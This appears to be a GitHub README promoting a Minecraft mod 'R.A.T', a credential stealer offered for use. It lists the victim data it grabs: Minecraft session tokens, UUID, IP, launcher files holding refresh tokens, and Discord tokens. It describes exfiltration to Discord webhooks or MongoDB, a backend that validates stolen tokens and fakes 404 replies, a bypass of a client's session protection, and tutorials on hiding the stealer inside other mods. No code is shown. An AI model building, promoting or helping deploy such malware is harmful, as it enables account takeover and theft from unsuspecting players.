> Check out [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth), a session id login mod.

> [1.12.2](https://github.com/DxxxxY/R.A.T/tree/1.12.2) version WITHOUT discord tokens.<br>[1.18](https://github.com/DxxxxY/R.A.T/tree/1.18) version WITH discord tokens.

## Features
- Grabs the **username, uuid, token, ip, feather file, essentials file, lunar file and discord tokens** of a target as a *JSON*.
- Apparently switching the feather or essential files with yours grants you infinite access to their account thanks to the **refreshToken**. (Unconfirmed, ask Annah#5795)
- Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
- JavaScript backend server which:
  - Checks if all fields in the JSON are present.
  - Controls requests and filters out spam requests by IPs.
  - Validates the token with Minecraft Auth servers before proceeding to output the data.

  It also fakes returning 404 codes to make the people think they successfully crashed the server 🤡.
  
- Makes nuking/trolling impossible, due to webhook/database urls being private.
- Can be easily be hosted on *Heroku*. (Tutorial available [here](https://www.youtube.com/watch?v=JWoBSp8XU_8&t=4s&ab_channel=DxxxxY))
- Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
- Bypasses PizzaClient's SessionProtection.
- Can be easily hidden/camouflaged in other mods (1 single class). (Tutorial available [here](https://www.youtube.com/watch?v=XedVI2JHCjA&t=152s&ab_channel=DxxxxY))

- Uses:
  - *Express* for the backend server.
  - *MongoDB* for storing ratted users.
  - *Discord API* for sending messages to webhook.
